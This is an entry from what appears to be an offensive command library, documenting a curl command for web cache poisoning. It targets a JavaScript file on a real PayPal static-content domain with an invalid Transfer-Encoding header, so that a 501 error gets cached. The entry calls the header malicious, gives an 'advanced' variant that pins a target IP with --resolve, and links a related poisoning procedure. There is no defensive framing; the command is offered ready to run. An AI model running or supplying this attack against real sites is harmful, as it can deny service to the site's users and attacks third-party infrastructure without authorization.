---
id: cmd-curl-poison-js
data: >-
  curl https://www.paypalobjects.com/path/to/script.js -H "Transfer-Encoding:
  invalid" -v
tags:
  - web
  - http
  - cache
type: command
output: |-
  HTTP/1.1 501 Not Implemented
  ...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:02.981Z'
verified: false
validated: true
submitted: true
---
# curl-cache-poison-js

## Command

```bash
curl https://www.paypalobjects.com/path/to/script.js -H "Transfer-Encoding: invalid" -v
```

## Description

Targets a JavaScript resource with an invalid Transfer-Encoding header to poison the cache response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Transfer-Encoding: invalid"` | Malicious header | Yes |
| `-v` | Verbose mode | Yes |

## Examples

### Basic Usage

```bash
curl https://www.paypalobjects.com/path/to/script.js -H "Transfer-Encoding: invalid" -v
```

### Advanced Usage

```bash
curl https://www.paypalobjects.com/path/to/script.js -H "Transfer-Encoding: invalid" --resolve www.paypalobjects.com:443:target-ip -v
```

## Expected Output

501 response that gets cached, verifiable on subsequent requests.

## Related

- [[Related Procedure: Poison-Cache-for-JavaScript-Resources]]
